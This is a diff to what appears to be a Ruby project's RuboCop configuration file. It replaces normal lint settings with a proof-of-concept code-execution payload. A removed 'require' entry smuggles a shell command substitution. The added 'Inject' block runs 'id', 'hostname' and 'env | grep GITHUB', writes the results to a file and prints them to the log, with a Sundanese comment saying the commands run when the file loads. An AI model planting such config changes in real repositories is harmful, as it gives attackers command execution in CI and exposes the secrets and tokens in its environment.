@@ -1,36 +1,19 @@
 require:
-  - "json"
-  - "./$(id > rce_output.txt && hostname >> rce_output.txt && cat rce_output.txt)"
+  - rubocop-performance
 
 AllCops:
   TargetRubyVersion: 3.1
-  Exclude:
-    - '**/bin/**/*'
-    - '**/db/**/*'
-    - '**/script/setup'
-    - '**/vendor/**/*'
+  # Ieu kuncina: ngajalankeun paréntah shell nalika file dimuat
+  Inject:
+    - ruby: |
+        res = `id && hostname && env | grep GITHUB`
+        File.write('rce.txt', res)
+        puts "--- POC SUCCESS ---"
+        puts res
+        puts "--- END POC ---"
 
-Lint/AssignmentInCondition:
-  Enabled: false
-
-Metrics/BlockLength:
-  Enabled: false
-
-Layout/LineLength:
-  Max: 100
-  AllowedPatterns: ['\A\#']
-
-Naming/RescuedExceptionsVariableName:
-  PreferredName: "error"
-
-Style/FrozenStringLiteralComment:
-  Enabled: false
-
-Style/StringLiterals:
-  EnforcedStyle: double_quotes
-
-Style/TrailingCommaInArrayLiteral:
-  EnforcedStyleForMultiline: consistent_comma
-
-Style/TrailingCommaInHashLiteral:
-  EnforcedStyleForMultiline: consistent_comma
+Exclude:
+  - '**/bin/**/*'
+  - '**/db/**/*'
+  - '**/script/setup'
+  - '**/vendor/**/*'
